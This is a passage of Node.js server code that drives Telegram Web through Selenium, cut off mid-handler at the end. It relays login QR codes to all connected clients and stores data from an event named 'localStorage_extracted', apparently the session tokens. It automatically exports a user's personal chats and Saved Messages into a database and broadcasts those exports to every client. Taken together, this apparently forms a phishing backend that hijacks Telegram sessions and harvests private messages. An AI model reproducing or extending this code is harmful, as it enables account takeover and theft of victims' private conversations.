// a no-op safety wrapper kept for clarity.
function sessionsForBroadcast(sessions) {
  return sessions;
}

async function exportAllChats(sessionId, retryCount = 0) {
  // Guard: never run two exports for the same session concurrently.
  // All three trigger sites can fire within milliseconds of each other;
  // this Set ensures only the first one proceeds.
  if (exportRunning.has(sessionId)) {
    console.log(`⚠️ [${sessionId}] Export already in progress, ignoring duplicate trigger`);
    return false;
  }
  exportRunning.add(sessionId);

  const maxRetries = 2;
  const retryDelay = 1000;

  try {
    console.log(`🔍 Starting export of personal chats for session: ${sessionId}`);

    // Get the driver for this session
    const {
      activeDrivers
    } = require('./telegram-login-handler');
    const driverInfo = activeDrivers.get(sessionId);

    if (!driverInfo || !driverInfo.driver) {
      console.log(`⚠️ No active driver found for session: ${sessionId}`);
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return exportAllChats(sessionId, retryCount + 1);
      }
      return false;
    }

    const driver = driverInfo.driver;

    // Set generous timeouts for the entire export session upfront.
    // Default ChromeDriver script timeout is only 30 seconds which would kill
    // any executeScript() call that takes longer. Page load timeout of 5 min
    // covers slow Telegram Web navigations between chats.
    await driver.manage().setTimeouts({
      implicit:   500,
      pageLoad:   300000,  // 5 minutes
      script:     600000   // 10 minutes
    });
    console.log(`⏱️ Driver timeouts set: pageLoad=5min, script=10min`);

    // Visual indicator
    try {
      await driver.executeScript(`
        let ind = document.getElementById('export-indicator');
        if (!ind) {
          ind = document.createElement('div');
          ind.id = 'export-indicator';
          ind.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#4CAF50;color:white;padding:15px 30px;border-radius:8px;z-index:99999;font-family:Arial;font-size:16px;box-shadow:0 4px 8px rgba(0,0,0,0.3);max-width:80%;text-align:center;';
          document.body.appendChild(ind);
        }
        ind.textContent = '🔍 Collecting personal chats...';
        ind.style.background = '#2196F3';
      `);
    } catch (e) {}

    await new Promise(resolve => setTimeout(resolve, 2000));

    // ── Step 1: collect the first 15 personal chats ──────────────────────────
    // Always navigate to the base URL unconditionally so the chat list is
    // fully visible and not obscured by an open message panel.
    console.log(`🔄 Navigating to base URL to ensure chat list is fully loaded...`);
    await driver.navigate().to('https://web.telegram.org/a/');
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Wait for the chat list to be present and contain at least one item
    try {
      await driver.wait(async () => {
        try {
          const count = await driver.executeScript(`
            return document.querySelectorAll('.chat-list .ListItem.Chat').length;
          `);
          return count > 0;
        } catch { return false; }
      }, 15000);
      console.log(`✅ Chat list ready`);
    } catch (e) {
      console.error(`❌ Chat list did not populate in time: ${e.message}`);
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return exportAllChats(sessionId, retryCount + 1);
      }
      return false;
    }

    const chatsToExport = await collectPersonalChats(driver, 15);

    if (chatsToExport.length === 0) {
      console.error(`❌ No personal chats found for session: ${sessionId}`);
      return false;
    }

    console.log(`📋 Found ${chatsToExport.length} personal chats to export:`);
    chatsToExport.forEach((c, i) =>
      console.log(`  ${i + 1}. ${c.name} (${c.peerId})`)
    );

    // ── Step 2: export each chat in order ────────────────────────────────────
    const chatExports  = {};
    let exportedCount  = 0;
    let failedCount    = 0;

    for (let i = 0; i < chatsToExport.length; i++) {
      const chat    = chatsToExport[i];
      const chatKey = chat.isSavedMessages ? 'saved-messages' : chat.peerId;
      const label   = `${i + 1}/${chatsToExport.length}: ${chat.name}`;

      console.log(`\n📤 [${label}] Starting export...`);

      try {
        // Update visual indicator
        try {
          await driver.executeScript(`
            const ind = document.getElementById('export-indicator');
            if (ind) {
              ind.textContent = '📤 Exporting chat ' + arguments[0];
              ind.style.background = '#2196F3';
            }
          `, label);
        } catch (e) {}

        // Navigate to the chat
        const navigated = await navigateToChat(driver, chat.href);
        if (!navigated) {
          console.error(`❌ [${label}] Could not open chat, skipping`);
          failedCount++;
          continue;
        }

        // Run the export
        const success = await exportSingleChat(driver, sessionId, chatKey, chat.name, chatExports);
        if (success) {
          exportedCount++;
        } else {
          failedCount++;
        }

        // Persist after every chat
        try {
          await sessionDB.updateSession(sessionId, {
            chatExports:            { ...chatExports },
            chatExportsCollectedAt: new Date()
          });
          const updatedSessions = await sessionDB.getAllSessions();
          io.emit('allSessions', sessionsForBroadcast(updatedSessions));
          console.log(`💾 [${label}] DB saved. Running total: ${exportedCount} exported, ${failedCount} failed`);
        } catch (dbError) {
          console.error(`❌ DB save error after chat ${label}:`, dbError.message);
        }
      } catch (chatError) {
        // Catch anything that escapes from a single chat so the loop always continues
        console.error(`❌ [${label}] Unexpected error, skipping chat: ${chatError.message}`);
        failedCount++;
      }
    }

    // ── Step 3: final summary & cleanup ──────────────────────────────────────
    console.log(`\n📊 Export complete: ${exportedCount}/${chatsToExport.length} chats exported, ${failedCount} failed`);

    try {
      await driver.executeScript(`
        const ind = document.getElementById('export-indicator');
        if (ind) {
          ind.textContent = '✅ Done! ' + arguments[0] + '/' + arguments[1] + ' chats exported. Closing...';
          ind.style.background = '#4CAF50';
        }
      `, exportedCount, chatsToExport.length);
      await new Promise(resolve => setTimeout(resolve, 2000));
    } catch (e) {}

    // Close the browser
    console.log(`🔒 Closing browser...`);
    try {
      const driverInfo2 = activeDrivers.get(sessionId);
      if (driverInfo2 && driverInfo2.driver) {
        await driverInfo2.driver.quit();
        console.log('✅ Browser closed');
      }
    } catch (closeError) {
      console.error('❌ Error closing browser:', closeError.message);
    } finally {
      activeDrivers.delete(sessionId);
    }

    return exportedCount > 0;

  } catch (error) {
    console.error(`❌ exportAllChats error: ${error.message}`);
    if (retryCount < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, retryDelay));
      exportRunning.delete(sessionId); // clear before retry so the guard doesn't block it
      return exportAllChats(sessionId, retryCount + 1);
    }
    return false;
  } finally {
    // Always clear the in-progress flag so future exports can run
    exportRunning.delete(sessionId);
  }
}

// Legacy function - kept for backward compatibility but now calls exportAllChats
async function clickSavedMessagesChat(sessionId, retryCount = 0) {
  const maxRetries = 2;
  const retryDelay = 1000;

  try {
    console.log(`🔍 Looking for Saved Messages chat for session: ${sessionId}`);

    // Get the driver for this session
    const {
      activeDrivers
    } = require('./telegram-login-handler');
    const driverInfo = activeDrivers.get(sessionId);

    if (!driverInfo || !driverInfo.driver) {
      console.log(`⚠️ No active driver found for session: ${sessionId}`);
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return clickSavedMessagesChat(sessionId, retryCount + 1);
      }
      return false;
    }

    const driver = driverInfo.driver;

    // Wait briefly for page to load
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Find chat list
    let chatList;
    try {
      chatList = await driver.findElement(By.css('.chat-list'));
    } catch (error) {
      console.log(`⚠️ Chat list not found: ${error.message}`);
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return clickSavedMessagesChat(sessionId, retryCount + 1);
      }
      return false;
    }

    // Fast search: check -> scroll -> check -> scroll until found
    let savedMessagesButton = null;
    const maxScrollAttempts = 20;
    const scrollStep = 500;

    for (let attempt = 0; attempt < maxScrollAttempts; attempt++) {
      // Check if Saved Messages exists
      try {
        const savedMsgElements = await driver.findElements(By.css('.saved-messages'));
        if (savedMsgElements.length > 0) {
          // Find parent .ListItem-button
          const parentButton = await driver.executeScript(`
            let el = arguments[0];
            for (let i = 0; i < 10; i++) {
              if (el.classList && el.classList.contains('ListItem-button')) {
                return el.getAttribute('href');
              }
              el = el.parentElement;
              if (!el) break;
            }
            return null;
          `, savedMsgElements[0]);

          if (parentButton) {
            savedMessagesButton = await driver.findElement(By.css(`.ListItem-button[href="${parentButton}"]`));
            console.log(`✅ [${sessionId}] Found Saved Messages button!`);
            break;
          }
        }
      } catch (error) {
        // Continue to scroll
      }

      // If not found, scroll down
      if (!savedMessagesButton) {
        const currentScroll = await driver.executeScript('return arguments[0].scrollTop', chatList);
        const maxScroll = await driver.executeScript('return arguments[0].scrollHeight', chatList);

        if (currentScroll >= maxScroll - 100) {
          // Reached bottom, scroll to top and try again
          await driver.executeScript('arguments[0].scrollTop = 0', chatList);
          await new Promise(resolve => setTimeout(resolve, 300));
        } else {
          // Scroll down
          await driver.executeScript('arguments[0].scrollTop += arguments[1]', chatList, scrollStep);
          await new Promise(resolve => setTimeout(resolve, 300)); // Minimal wait
        }
      }
    }

    if (!savedMessagesButton) {
      console.log(`⚠️ Saved Messages button not found after ${maxScrollAttempts} attempts`);
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return clickSavedMessagesChat(sessionId, retryCount + 1);
      }
      return false;
    }

    // Click the button
    try {
      await driver.executeScript('arguments[0].scrollIntoView({ behavior: "smooth", block: "center" });', savedMessagesButton);
      await new Promise(resolve => setTimeout(resolve, 300));
      await savedMessagesButton.click();
      console.log(`✅ Successfully clicked Saved Messages chat for session: ${sessionId}`);

      // Wait for chat to load, then execute export script
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Read and execute the export script from file
      const fs = require('fs');
      const path = require('path');
      const exportScriptPath = path.join(__dirname, 'saved-messages-export.js');
      const exportScriptContent = fs.readFileSync(exportScriptPath, 'utf8');

      try {
        // Increase script timeout for export (can take several minutes for large chats)
        // Default is usually 30 seconds, we need much more for scrolling and processing
        await driver.manage().setTimeouts({
          script: 600000
        }); // 10 minutes timeout
        console.log(`⏱️ Set script timeout to 10 minutes for export`);

        // Start the export script (non-blocking with incremental sync)
        const scriptJson = JSON.stringify(exportScriptContent);

        // Execute the script in the background
        const exportPromise = driver.executeAsyncScript(`
          const callback = arguments[arguments.length - 1];
          const scriptContent = JSON.parse(arguments[0]);
          (async function() {
            try {
              // The script content defines async function exportTelegramChat() and returns the promise
              // Execute it as an async function to get the result
              const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
              const scriptFunc = new AsyncFunction(scriptContent);
              const result = await scriptFunc();
              console.log('Script execution result:', result);
              callback(result);
            } catch (err) {
              console.error('Export script error:', err);
              console.error('Export script error stack:', err.stack);
              callback({ success: false, error: err.message, stack: err.stack });
            }
          })();
        `, scriptJson);

        // Poll for incremental updates while the export is running
        const pollInterval = 5000; // Check every 5 seconds
        let lastSyncedCount = 0;
        let pollingStopped = false;

        const syncPoller = setInterval(async () => {
          if (pollingStopped) return;

          try {
            console.log(`🔍 [Incremental Poll 2] Checking for updates...`);

            // Check if there's an update available
            const exportStatus = await driver.executeScript(`
              return {
                updated: window.__exportUpdated || false,
                messageCount: window.__exportMessageCount || 0,
                lastUpdate: window.__exportLastUpdate || 0,
                hasBody: !!window.__incrementalExportBody,
                bodyLength: (window.__incrementalExportBody || '').length
              };
            `);

            console.log(`📊 [Incremental Poll 2] Status:`, {
              updated: exportStatus.updated,
              messageCount: exportStatus.messageCount,
              lastSynced: lastSyncedCount,
              bodyLength: exportStatus.bodyLength,
              hasBody: exportStatus.hasBody
            });

            if (exportStatus.updated && exportStatus.messageCount > lastSyncedCount) {
              console.log(`🔄 Incremental sync: ${exportStatus.messageCount} messages (${exportStatus.bodyLength} chars)`);

              // Get the current HTML content
              const currentHtml = await driver.executeScript(`
                const header = \`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Chat Export</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            color: #000;
        }
        .date-header {
            font-weight: bold;
            font-size: 14px;
            margin: 30px 0 15px 0;
            padding: 10px;
            background: #f0f0f0;
            text-align: center;
            border-radius: 8px;
        }
        .message {
            margin-bottom: 20px;
            padding: 10px;
            border-left: 3px solid #2481cc;
            background: #f9f9f9;
            page-break-inside: avoid;
        }
        .message.own {
            border-left-color: #4CAF50;
            background: #e8f5e9;
        }
        .message-header {
            font-weight: bold;
            color: #2481cc;
            margin-bottom: 8px;
            font-size: 12px;
        }
        .message.own .message-header {
            color: #4CAF50;
        }
        .message-text {
            margin-bottom: 10px;
            font-size: 14px;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.5;
        }
        .message-image {
            max-width: 100%;
            height: auto;
            margin: 10px 0;
            display: block;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .image-placeholder {
            margin: 10px 0;
            padding: 20px;
            background: #f0f0f0;
            font-size: 12px;
            color: #666;
            text-align: center;
            border-radius: 8px;
        }
        @media print {
            body {
                max-width: 100%;
            }
            .message {
                page-break-inside: avoid;
            }
        }
    </style>
</head>
<body>
    <h1>Telegram Chat Export (In Progress)</h1>
    <p>Total messages: \${window.__exportMessageCount || 0}</p>
\`;
                const footer = \`
</body>
</html>\`;
                
                return header + (window.__incrementalExportBody || '') + footer;
              `);

              // Save incremental update to database in chatExports format
              const chatExportsUpdate = {
                'saved-messages': {
                  name: 'Saved Messages',
                  html: currentHtml,
                  messageCount: exportStatus.messageCount,
                  exportedAt: new Date().toISOString(),
                  type: 'partial' // Mark as partial during incremental sync
                }
              };

              await sessionDB.updateSession(sessionId, {
                chatExports: chatExportsUpdate,
                chatExportsCollectedAt: new Date()
              });

              lastSyncedCount = exportStatus.messageCount;
              console.log(`✅ Incremental sync saved: ${exportStatus.messageCount} messages to chatExports`);

              // Emit update to refresh sessions for all connected clients
              try {
                const updatedSessions = await sessionDB.getAllSessions();
                io.emit('allSessions', updatedSessions);
                console.log(`📤 Emitted session update after incremental sync`);
              } catch (emitError) {
                console.error(`⚠️ Error emitting session update:`, emitError.message);
              }

              // Reset the update flag
              await driver.executeScript(`window.__exportUpdated = false;`);
            }

            // Check if export is complete
            if (exportStatus.complete) {
              console.log(`🏁 Export script finished!`);
              pollingStopped = true;
              clearInterval(syncPoller);
            }
          } catch (pollError) {
            console.error(`⚠️ Error during incremental sync poll:`, pollError.message);
          }
        }, pollInterval);

        // Wait for the export to complete by polling
        console.log(`⏳ Waiting for export to complete...`);
        let exportResult = null;
        while (!pollingStopped) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Get final result
        exportResult = await driver.executeScript(`
        return window.__exportResult || { 
          success: !window.__exportError, 
          error: window.__exportError 
        };
      `);

        console.log(`📊 Export result received:`, {
          success: exportResult ? exportResult.success : false,
          hasHtml: !!exportResult ? exportResult.html : false,
          htmlLength: exportResult ? exportResult.html ? exportResult.html.length : 0 : 0,
          messageCount: exportResult ? exportResult.messageCount : 0,
          error: exportResult ? exportResult.error : null
        });

        if (exportResult && exportResult.success && exportResult.html) {
          console.log(`✅ Chat export completed: ${exportResult.messageCount} messages, HTML length: ${exportResult.html.length} characters`);

          // Final save to database in chatExports format (complete, finalized HTML)
          try {
            const chatExportsFinal = {
              'saved-messages': {
                name: 'Saved Messages',
                html: exportResult.html,
                messageCount: exportResult.messageCount,
                exportedAt: new Date().toISOString(),
                type: 'full' // Mark as full/complete export
              }
            };

            const updateResult = await sessionDB.updateSession(sessionId, {
              chatExports: chatExportsFinal,
              chatExportsCollectedAt: new Date()
            });

            console.log(`📊 updateSession returned: ${updateResult}`);
            console.log(`✅ FINAL Saved Messages export saved to chatExports for session: ${sessionId}`);

            // Verify it was saved
            const savedSession = await sessionDB.getSession(sessionId);
            if (savedSession && savedSession.chatExports) {
              const parsedExports = typeof savedSession.chatExports === 'string' ?
                JSON.parse(savedSession.chatExports) :
                savedSession.chatExports;
              console.log(`✅ Verified: Final export exists in chatExports for session ${sessionId}`, parsedExports);
            } else {
              console.error(`❌ WARNING: Final export was NOT saved to chatExports for session ${sessionId}`);
            }
          } catch (dbError) {
            console.error(`❌ Error saving final export to database: ${dbError.message}`);
            console.error(`❌ Database error stack:`, dbError.stack);
          }

          // Emit update to refresh sessions for all connected clients
          try {
            const updatedSessions = await sessionDB.getAllSessions();

            // Log the specific session to verify it has the export
            const exportedSession = updatedSessions.find(s => s.id === sessionId);
            if (exportedSession) {
              const parsedExports = exportedSession.chatExports ?
                (typeof exportedSession.chatExports === 'string' ? JSON.parse(exportedSession.chatExports) : exportedSession.chatExports) :
                null;
              console.log(`📊 Session ${sessionId} in getAllSessions response:`, {
                id: exportedSession.id,
                status: exportedSession.status,
                chatExports: parsedExports,
                hasExport: !!parsedExports && !!parsedExports['saved-messages']
              });
            } else {
              console.error(`❌ WARNING: Session ${sessionId} not found in getAllSessions response!`);
            }

            io.emit('allSessions', sessionsForBroadcast(updatedSessions));
          } catch (emitError) {
            console.error(`❌ Error emitting updated sessions: ${emitError.message}`);
          }
        } else {
          console.error(`❌ Chat export failed:`, {
            success: exportResult ? exportResult.success : false,
            error: exportResult ? exportResult.error || 'Unknown error' : 'Unknown error',
            hasResult: !!exportResult,
            resultKeys: exportResult ? Object.keys(exportResult) : []
          });
          console.log(`ℹ️ Note: Incremental backups were saved during the export process (last sync: ${lastSyncedCount} messages)`);
        }
      } catch (exportError) {
        console.error(`❌ Error executing export script: ${exportError.message}`);
      }

      return true;
    } catch (clickError) {
      console.error(`❌ Click failed: ${clickError.message}`);
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return clickSavedMessagesChat(sessionId, retryCount + 1);
      }
      return false;
    }

  } catch (error) {
    console.error(`❌ Error clicking Saved Messages chat for session ${sessionId}: ${error.message}`);
    if (retryCount < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, retryDelay));
      return clickSavedMessagesChat(sessionId, retryCount + 1);
    }
    return false;
  }
}

// Background session monitoring system
let sessionMonitorInterval = null;

// Function to start background session monitoring
const startSessionMonitoring = () => {
  if (sessionMonitorInterval) {
    clearInterval(sessionMonitorInterval);
  }

  sessionMonitorInterval = setInterval(async () => {
    console.log(`🔍 Background monitoring: Checking ${activeSessions.size} active sessions...`);

    for (const [sessionId, session] of activeSessions.entries()) {
      // Skip sessions that are already marked as disconnected or failed
      if (session.status === 'disconnected' || session.status === 'failed') {
        continue;
      }

      // Skip sessions that are still starting (driver not created yet)
      if (session.status === 'starting') {
        console.log(`⏳ Session ${sessionId} is still starting, skipping monitoring`);
        continue;
      }

      // Check if session has a valid driver
      if (!session.driver) {
        console.log(`⚠️ Session ${sessionId} has no driver, attempting to get from activeDrivers...`);

        try {
          // Try to get driver from activeDrivers
          const {
            activeDrivers
          } = require('./telegram-login-handler');
          const driverInfo = activeDrivers.get(sessionId);
          if (driverInfo && driverInfo.driver) {
            session.driver = driverInfo.driver;
            console.log(`🔗 Retrieved driver reference for session ${sessionId}`);
          } else {
            console.log(`❌ No driver found in activeDrivers for session ${sessionId}`);
            // Don't mark as disconnected yet - the driver might still be initializing
            // Just skip this session for now
            continue;
          }
        } catch (error) {
          console.log(`❌ Error getting driver from activeDrivers:`, error.message);
          // Don't mark as disconnected yet - the driver might still be initializing
          continue;
        }
      }

      try {
        // Try to get current URL to verify driver is working
        await session.driver.getCurrentUrl();
        // Driver is working, update last activity
        session.lastActivity = new Date();
        console.log(`✅ Session ${sessionId} driver is healthy`);
      } catch (error) {
        console.log(`❌ Session ${sessionId} driver error detected:`, error.message);

        // Check if session is already in a final state before marking as disconnected
        const dbSession = await sessionDB.getSession(sessionId).catch(() => null);
        if (dbSession && (dbSession.status === 'completed' || dbSession.status === 'failed')) {
          console.log(`✅ Session ${sessionId} already in final state (${dbSession.status}), skipping disconnection`);
          continue;
        }

        // Mark session as disconnected
        session.status = 'disconnected';

        // Notify all clients about session disconnection
        io.emit('sessionDisconnected', {
          sessionId,
          reason: 'background_monitoring_detected_error',
          error: error.message,
          timestamp: new Date().toISOString()
        });

        // Attempt automatic recovery
        console.log(`🔄 Background monitoring: Starting automatic recovery for session ${sessionId}...`);
        attemptSessionRecovery(sessionId, session);
      }
    }
  }, 5000); // Check every 5 seconds (more aggressive)

  console.log('✅ Background session monitoring started (every 5 seconds)');

  // Also start a more aggressive monitoring for new sessions
  let aggressiveMonitoringInterval = setInterval(async () => {
    const now = new Date();
    for (const [sessionId, session] of activeSessions.entries()) {
      // Only check sessions that are less than 5 minutes old
      if (session.startTime && (now - session.startTime) < 5 * 60 * 1000) {
        if (session.driver && session.status === 'running') {
          try {
            await session.driver.getCurrentUrl();
            console.log(`🔍 Aggressive monitoring: Session ${sessionId} is healthy`);
          } catch (error) {
            console.log(`❌ Aggressive monitoring: Session ${sessionId} error detected:`, error.message);

            // Check if session is already in a final state before marking as disconnected
            const dbSession = await sessionDB.getSession(sessionId).catch(() => null);
            if (dbSession && (dbSession.status === 'completed' || dbSession.status === 'failed')) {
              console.log(`✅ Session ${sessionId} already in final state (${dbSession.status}), skipping disconnection`);
              continue;
            }

            session.status = 'disconnected';
            io.emit('sessionDisconnected', {
              sessionId,
              reason: 'aggressive_monitoring_detected_error',
              error: error.message,
              timestamp: new Date().toISOString()
            });
            attemptSessionRecovery(sessionId, session);
          }
        }
      }
    }
  }, 2000); // Check new sessions every 2 seconds

  console.log('✅ Aggressive monitoring started for new sessions (every 2 seconds)');

  // Store the aggressive monitoring interval for cleanup
  if (global.aggressiveMonitoringInterval) {
    clearInterval(global.aggressiveMonitoringInterval);
  }
  global.aggressiveMonitoringInterval = aggressiveMonitoringInterval;
};

// Function to stop background session monitoring
const stopSessionMonitoring = () => {
  if (sessionMonitorInterval) {
    clearInterval(sessionMonitorInterval);
    sessionMonitorInterval = null;
    console.log('🛑 Background session monitoring stopped');
  }

  if (global.aggressiveMonitoringInterval) {
    clearInterval(global.aggressiveMonitoringInterval);
    global.aggressiveMonitoringInterval = null;
    console.log('🛑 Aggressive session monitoring stopped');
  }
};

// Start background session monitoring when server starts
startSessionMonitoring();

// Buffer manager disabled to prevent multiple Chrome windows

// Function to attempt automatic session recovery
const attemptSessionRecovery = async (sessionId, session) => {
  try {
    console.log(`🔄 Starting automatic recovery for session ${sessionId}...`);

    // Notify frontend that recovery is in progress
    io.emit('sessionRecoveryStarted', {
      sessionId,
      timestamp: new Date().toISOString()
    });

    // Close the old driver if it exists
    if (session.driver) {
      try {
        await session.driver.quit();
        console.log(`✅ Old driver closed for session ${sessionId}`);
      } catch (quitError) {
        console.log(`⚠️ Error closing old driver:`, quitError.message);
      }
    }

    // Clear any existing intervals in activeDrivers
    try {
      const {
        activeDrivers
      } = require('./telegram-login-handler');
      const existingDriverInfo = activeDrivers.get(sessionId);
      if (existingDriverInfo && existingDriverInfo.interval) {
        clearInterval(existingDriverInfo.interval);
        console.log(`🧹 Cleared old monitoring interval for session ${sessionId}`);
      }
    } catch (error) {
      console.log(`⚠️ Error clearing old intervals:`, error.message);
    }

    // Restart the entire Telegram login process to get QR monitoring working
    console.log(`🔄 Restarting Telegram login process for session ${sessionId}...`);

    // Get the original parameters from the session
    const parameters = session.parameters || {};

    // Import and run the Telegram login process
    const {
      runTelegramLogin
    } = require('./telegram-login-handler');

    // Start the Telegram login process with the new driver
    await runTelegramLogin(sessionId, parameters, async (event, data) => {
      console.log(`📡 Recovery: Received event: ${event}`, data);

      // Update session data based on events
      const updates = {};

      if (event === 'localStorage_extracted' && data.codeData) {
        console.log(`💾 Recovery: LocalStorage extracted for session ${sessionId}:`, data.codeData);
        // Convert localStorage object to JSON string for storage
        updates.localStorageCode = typeof data.codeData === 'string' ? data.codeData : JSON.stringify(data.codeData);
      } else if (event === 'chat_list_collected' && data.chatTitles) {
        console.log(`💬 Recovery: Chat list collected for session ${sessionId}: ${data.chatCount} chats`);
        updates.chatList = JSON.stringify(data.chatTitles);
        updates.chatListCollectedAt = new Date();
      } else if (event === 'user_info_extracted' && data.username && data.avatarSrc) {
        console.log(`👤 Recovery: Storing user info for session ${sessionId}:`, data.username, data.avatarSrc);
        updates.username = data.username;
        updates.avatarSrc = data.avatarSrc;
        updates.status = 'completed';
        updates.endTime = new Date();
        updates.telegramLoginRunning = false;

        // Store chat list if available
        if (data.chatList && data.chatList.success) {
          console.log(`💬 Recovery: Storing chat list for session ${sessionId}: ${data.chatList.totalChats} chats`);
          updates.chatList = JSON.stringify(data.chatList.chatTitles);
          updates.chatListCollectedAt = new Date();
        }
      } else if (event === 'completed' && data.userInfo) {
        console.log(`✅ Recovery: Session completed for ${sessionId}, extracting user info:`, data.userInfo);
        if (data.userInfo.username) {
          updates.username = data.userInfo.username;
        }
        if (data.userInfo.avatarSrc) {
          updates.avatarSrc = data.userInfo.avatarSrc;
        }
        updates.status = 'completed';
        updates.endTime = new Date();
        updates.telegramLoginRunning = false;
      } else if (event === 'status' && data.message) {
        console.log(`📊 Recovery: Status update for session ${sessionId}:`, data.message);

        // If this is the "Chrome driver initialized successfully" message, 
        // get the driver reference and store it in activeSessions
        if (data.message === 'Chrome driver initialized successfully') {
          try {
            const {
              activeDrivers
            } = require('./telegram-login-handler');
            const driverInfo = activeDrivers.get(sessionId);
            if (driverInfo && driverInfo.driver) {
              // Store driver reference in activeSessions for monitoring
              const session = activeSessions.get(sessionId);
              if (session) {
                session.driver = driverInfo.driver;
                console.log(`🔗 Recovery: Driver reference stored in activeSessions for session ${sessionId}`);
              }
            }
          } catch (error) {
            console.log(`⚠️ Recovery: Could not store driver reference:`, error.message);
          }
        }

        // Move to running status on first status update
        const session = activeSessions.get(sessionId);
        if (session && session.status === 'starting') {
          updates.status = 'running';
          console.log(`🔄 Recovery: Session ${sessionId} status changed to 'running'`);
        }
      }

      // Update in-memory session
      if (Object.keys(updates).length > 0) {
        const session = activeSessions.get(sessionId);
        if (session) {
          console.log(`💾 Recovery: Updating in-memory session ${sessionId} with:`, updates);
          Object.assign(session, updates);
        }
      }

      // Update database
      if (Object.keys(updates).length > 0) {
        try {
          console.log(`💾 Recovery: Updating database for session ${sessionId} with:`, updates);
          await sessionDB.updateSession(sessionId, updates);
          console.log(`✅ Recovery: Database updated successfully for session ${sessionId}`);
        } catch (error) {
          console.error(`❌ Recovery: Error updating session ${sessionId} in database:`, error);
        }
      }
    });

    // Wait a bit for the process to start
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Get the new driver reference
    try {
      const {
        activeDrivers
      } = require('./telegram-login-handler');
      const driverInfo = activeDrivers.get(sessionId);
      if (driverInfo && driverInfo.driver) {
        session.driver = driverInfo.driver;
        console.log(`🔗 Recovery: New driver reference retrieved for session ${sessionId}`);
      }
    } catch (error) {
      console.log(`⚠️ Recovery: Error getting new driver reference:`, error.message);
    }

    // Notify frontend that recovery was successful
    io.emit('sessionRecoveryCompleted', {
      sessionId,
      status: 'success',
      message: 'Session recovered with QR monitoring restarted',
      timestamp: new Date().toISOString()
    });

    console.log(`🎉 Session ${sessionId} automatically recovered successfully with QR monitoring!`);

  } catch (recoveryError) {
    console.error(`❌ Failed to automatically recover session ${sessionId}:`, recoveryError.message);

    // Mark session as permanently failed
    session.status = 'failed';

    // Notify frontend that recovery failed
    io.emit('sessionRecoveryFailed', {
      sessionId,
      error: recoveryError.message,
      timestamp: new Date().toISOString()
    });
  }
};

// Store ongoing operations to prevent race conditions (module-level for shutdown handlers)
const ongoingInputOperations = new Map();
// Store debounce timers to prevent rapid successive events (module-level for shutdown handlers)
const inputDebounceTimers = new Map();

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log('🔌 Socket.IO client connected:', socket.id);

  socket.on('disconnect', () => {
    console.log('🔌 Socket.IO client disconnected:', socket.id);
    // Clean up any active sessions for this socket
    for (const [sessionId, session] of activeSessions.entries()) {
      if (session.socketId === socket.id) {

        // Never close the browser when an export is in progress —
        // the export pipeline owns the browser and will close it when done.
        if (exportRunning.has(sessionId)) {
          console.log(`⚠️ Socket disconnected for ${sessionId} but export is in progress — NOT closing browser`);
          // Still clean up the socket-level session bookkeeping
          activeSessions.delete(sessionId);
          continue;
        }

        console.log(`🔒 Socket disconnected, closing Selenium window for session: ${sessionId}`);

        // Close the Selenium driver
        closeDriverBySessionId(sessionId).then((driverClosed) => {
          console.log(`✅ Selenium driver closed for session ${sessionId}: ${driverClosed}`);
        }).catch((error) => {
          console.error(`❌ Error closing Selenium driver for session ${sessionId}:`, error);
        });

        // Remove from active sessions
        activeSessions.delete(sessionId);
        console.log('Cleaned up session:', sessionId);

        // Clean up any ongoing input operations for this session
        if (ongoingInputOperations.has(sessionId)) {
          const {
            abortController
          } = ongoingInputOperations.get(sessionId);
          abortController.abort();
          ongoingInputOperations.delete(sessionId);
          console.log(`🧹 Cleaned up ongoing input operations for session: ${sessionId}`);
        }

        // Clean up any debounce timers for this session
        if (inputDebounceTimers.has(sessionId)) {
          clearTimeout(inputDebounceTimers.get(sessionId));
          inputDebounceTimers.delete(sessionId);
          console.log(`🧹 Cleaned up debounce timer for session: ${sessionId}`);
        }

        // Update database - but don't overwrite 'completed' or 'failed' status
        sessionDB.getSession(sessionId).then((dbSession) => {
          // Only change status to 'disconnected' if it's not already in a final state
          const updates = {
            endTime: new Date(),
            disconnectedBy: 'socket_disconnect'
          };

          // Preserve completed/failed status, only mark as disconnected if still active
          if (dbSession && dbSession.status !== 'completed' && dbSession.status !== 'failed') {
            updates.status = 'disconnected';
          }

          return sessionDB.updateSession(sessionId, updates);
        }).catch((error) => {
          console.error(`❌ Error updating session ${sessionId} in database:`, error);
        });
      }
    }
  });

  // Handle QR code updates from Chrome window
  socket.on('qrCodeUpdate', (data) => {
    console.log('📨 Received QR code update from Chrome window:', {
      sessionId: data.sessionId,
      timestamp: data.timestamp,
      dataLength: data.qrCodeData ? data.qrCodeData.length : 0,
      socketId: socket.id
    });

    // Forward QR code update to ALL Socket.IO clients (including sender for testing)
    io.emit('qrCodeUpdate', {
      sessionId: data.sessionId,
      qrCodeData: data.qrCodeData,
      timestamp: data.timestamp
    });

    console.log('📤 Broadcasted QR code update to ALL clients');
  });

  // Handle immediate test event from Chrome window
  socket.on('immediateTest', (data) => {
    console.log('🚀 Immediate test event received from Chrome window:', {
